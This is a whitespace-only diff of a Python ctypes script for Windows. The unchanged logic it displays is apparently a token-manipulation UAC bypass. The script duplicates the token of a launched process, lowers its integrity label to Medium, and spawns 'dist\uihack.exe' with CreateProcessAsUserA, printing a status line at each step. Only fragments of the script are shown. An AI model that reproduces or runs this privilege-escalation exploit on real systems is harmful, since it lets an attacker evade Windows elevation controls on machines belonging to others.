@@ -16,29 +16,29 @@ class TOKEN_TYPE(c_enum):
 	TokenImpersonation 	= 2
 
 class TOKEN_INFORMATION_CLASS(c_enum):
-	TokenUser			  = 1
-	TokenElevation		  = 20
-	TokenIntegrityLevel   = 25
+	TokenUser		= 1
+	TokenElevation		= 20
+	TokenIntegrityLevel	= 25
 
 class IntegrityLevel(object):
-	HIGH_RID		= 0x00003000
-	MEDIUM_RID 		= 0x00002000
+	HIGH_RID	= 0x00003000
+	MEDIUM_RID	= 0x00002000
 	MEDIUM_PLUS_RID = MEDIUM_RID + 0x100
 
 class GroupAttributes(object):
-	SE_GROUP_ENABLED			= 0x00000004
-	SE_GROUP_INTEGRITY			= 0x00000020         
-	SE_GROUP_LOGON_ID			= 0xC0000000 
-	SE_GROUP_MANDATORY			= 0x00000001 
-	SE_GROUP_OWNER				= 0x00000008   
-	SE_GROUP_RESOURCE			= 0x20000000 
+	SE_GROUP_ENABLED	= 0x00000004
+	SE_GROUP_INTEGRITY	= 0x00000020         
+	SE_GROUP_LOGON_ID	= 0xC0000000 
+	SE_GROUP_MANDATORY	= 0x00000001 
+	SE_GROUP_OWNER		= 0x00000008   
+	SE_GROUP_RESOURCE	= 0x20000000 
 	SE_GROUP_USE_FOR_DENY_ONLY  = 0x00000010 
 	SE_GROUP_INTEGRITY_ENABLED  = 0x00000040
 	SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
 
 class SID_AND_ATTRIBUTES(ctypes.Structure):                           
-    _fields_ = [("Sid",			ctypes.c_void_p),
-				("Attributes",	ctypes.c_ulong)]
+    _fields_ = [("Sid",		ctypes.c_void_p),
+		("Attributes",	ctypes.c_ulong)]
 
 class TOKEN_MANDATORY_LABEL(ctypes.Structure):
     _fields_ = [("Label",	SID_AND_ATTRIBUTES)]
@@ -48,40 +48,40 @@ class SID_IDENTIFIER_AUTHORITY(ctypes.Structure):
 
 class ShellExecInfo(ctypes.Structure):
 	_fields_ = [("cbSize", 		 ctypes.c_uint32),
-				("fMask",		 ctypes.c_ulong),
-				("hwnd", 		 ctypes.c_void_p),
-				("lpVerb", 		 ctypes.c_wchar_p),
-				("lpFile", 		 ctypes.c_wchar_p),
-				("lpParameters", ctypes.c_wchar_p),
-				("lpDirectory",  ctypes.c_wchar_p),
-				("nShow", 		 ctypes.c_int),
-				("hInstApp", 	 ctypes.c_void_p),
-				("lpIDList", 	 ctypes.c_void_p),
-				("lpClass", 	 ctypes.c_wchar_p),
-				("hKeyClass", 	 ctypes.c_void_p),
-				("dwHotKey", 	 ctypes.c_uint32),
-				("hIcon", 	 	 ctypes.c_void_p),
-				("hProcess", 	 ctypes.c_void_p)]
+			("fMask",	 ctypes.c_ulong),
+			("hwnd", 	 ctypes.c_void_p),
+			("lpVerb", 	 ctypes.c_wchar_p),
+			("lpFile", 	 ctypes.c_wchar_p),
+			("lpParameters", ctypes.c_wchar_p),
+			("lpDirectory",  ctypes.c_wchar_p),
+			("nShow", 	 ctypes.c_int),
+			("hInstApp", 	 ctypes.c_void_p),
+			("lpIDList", 	 ctypes.c_void_p),
+			("lpClass", 	 ctypes.c_wchar_p),
+			("hKeyClass", 	 ctypes.c_void_p),
+			("dwHotKey", 	 ctypes.c_uint32),
+			("hIcon", 	 ctypes.c_void_p),
+			("hProcess", 	 ctypes.c_void_p)]
 
 class PROCESS_INFORMATION(ctypes.Structure):                          
     _fields_ = [("hProcess", 	 ctypes.c_void_p),
-				("hThread", 	 ctypes.c_void_p),
-				("dwProcessId",  ctypes.c_ulong),
-				("dwThreadId", 	 ctypes.c_ulong)]
+		("hThread", 	 ctypes.c_void_p),
+		("dwProcessId",  ctypes.c_ulong),
+		("dwThreadId", 	 ctypes.c_ulong)]
 
 class STARTUPINFO(ctypes.Structure):
-    _fields_ = [("cb", 				ctypes.c_ulong),
+    _fields_ = [("cb", 			ctypes.c_ulong),
                ("lpReserved",		ctypes.c_char_p),
                ("lpDesktop", 		ctypes.c_char_p),
-               ("lpTitle",			ctypes.c_char_p),
-               ("dwX", 				ctypes.c_ulong),
-               ("dwY", 				ctypes.c_ulong),
-               ("dwXSize", 			ctypes.c_ulong),
-               ("dwYSize", 			ctypes.c_ulong),
+               ("lpTitle",		ctypes.c_char_p),
+               ("dwX", 			ctypes.c_ulong),
+               ("dwY", 			ctypes.c_ulong),
+               ("dwXSize", 		ctypes.c_ulong),
+               ("dwYSize", 		ctypes.c_ulong),
                ("dwXCountChars", 	ctypes.c_ulong),
                ("dwYCountChars", 	ctypes.c_ulong),
                ("dwFillAttribute", 	ctypes.c_ulong),
-               ("dwFlags", 			ctypes.c_ulong),
+               ("dwFlags", 		ctypes.c_ulong),
                ("wShowWindow",		ctypes.c_ushort),
                ("cbReserved2",		ctypes.c_ushort),
                ("lpReserved2",		ctypes.POINTER(ctypes.c_byte)),
@@ -127,7 +127,7 @@ def main():
 		# 
 		token = ctypes.c_void_p(ctypes.c_void_p(-1).value)
 		if ctypes.windll.ntdll.NtOpenProcessToken(shinfo.hProcess, (TOKEN_DUPLICATE | TOKEN_QUERY),
-													ctypes.byref(token)) == ctypes.c_ulong(0xC0000001):
+							ctypes.byref(token)) == ctypes.c_ulong(0xC0000001):
 			print "[-] Unable to open process token using NtOpenProcessToken"
 			return False
 		else:
@@ -139,7 +139,7 @@ def main():
 		#
 		dtoken = ctypes.c_void_p(ctypes.c_void_p(-1).value)
 		if ctypes.windll.ntdll.NtDuplicateToken(token, TOKEN_ALL_ACCESS, None, False,
-												TOKEN_TYPE.TokenPrimary, ctypes.byref(dtoken)) == ctypes.c_ulong(0xC0000001):
+							TOKEN_TYPE.TokenPrimary, ctypes.byref(dtoken)) == ctypes.c_ulong(0xC0000001):
 			print "[-] Unable to duplicate token using NtDuplicateToken"
 			return False
 		else:
@@ -157,7 +157,7 @@ def main():
 		pIntegritySid = ctypes.c_void_p()
 
 		if ctypes.windll.ntdll.RtlAllocateAndInitializeSid(ctypes.byref(mlAuthority), 1, IntegrityLevel.MEDIUM_RID,
-															0, 0, 0, 0, 0, 0, 0, ctypes.byref(pIntegritySid)) == ctypes.c_ulong(0xC0000001):
+									0, 0, 0, 0, 0, 0, 0, ctypes.byref(pIntegritySid)) == ctypes.c_ulong(0xC0000001):
 			print "[-] Unable to Initialize Medium SID using RtlAllocateAndInitializeSid"
 			return False
 		else:
@@ -171,7 +171,7 @@ def main():
 		tml.Label = saa
 
 		if ctypes.windll.ntdll.NtSetInformationToken(dtoken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
-														ctypes.byref(tml), ctypes.sizeof(tml)) == ctypes.c_ulong(0xC0000001):													
+								ctypes.byref(tml), ctypes.sizeof(tml)) == ctypes.c_ulong(0xC0000001):													
 			print "[-] Unable to lower duplicated token IL from Medium+ to Medium using NtSetInformationToken"
 			return False
 		else:
@@ -191,8 +191,8 @@ def main():
 		lpApplicationName = os.path.join(os.getcwd(), "dist\\uihack.exe")
 
 		if not ctypes.windll.advapi32.CreateProcessAsUserA(dtoken, None, lpApplicationName, None, None, False,
-												(0x04000000 | 0x00000010), None, None, ctypes.byref(lpStartupInfo),
-												ctypes.byref(lpProcessInformation)):
+									(0x04000000 | 0x00000010), None, None, ctypes.byref(lpStartupInfo),
+									ctypes.byref(lpProcessInformation)):
 			print "[-] Unable to create process using CreateProcessAsUserA"
 			return False
 		else:
